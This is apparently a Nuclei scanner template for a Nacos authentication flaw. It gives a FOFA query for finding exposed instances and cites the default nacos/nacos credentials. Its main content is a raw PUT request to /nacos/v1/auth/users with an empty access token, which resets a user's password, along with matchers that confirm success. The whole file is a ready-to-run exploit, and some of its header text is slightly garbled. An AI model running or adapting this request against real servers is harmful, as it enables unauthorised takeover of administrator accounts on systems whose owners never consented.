id: nacos-password-reset

info:
  name: "Nacos 密码重置机制身份校验缺失漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="nacos"
          默认凭证配置为nacos/nacos
      reference: https://example.com/cve-details
      该漏洞源于Nacos系统在密码重置流程中未正确校验用户身份凭证，攻击者可利用预置的默认账户凭证绕过身份验证机制，实现对系统管理员账户的非授权访问。此缺陷允许远程攻击者在未进行身份验证的情况下直接完成密码重置操作，从而获得对目标系统的完全控制权限。
  tags: Nacos

http:
- raw:
  - |
    PUT /nacos/v1/auth/users?accessToken=&username=NdayPoc&password=NdayPoc HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml:q=0.9,image/avif,image/webp.*/*:q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW:q=0.7,zh-HK;q=0.5.en-US:q=0.3.en:q=0.2
    Accept-Encoding: gzip, deflate
    Comnection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'update'
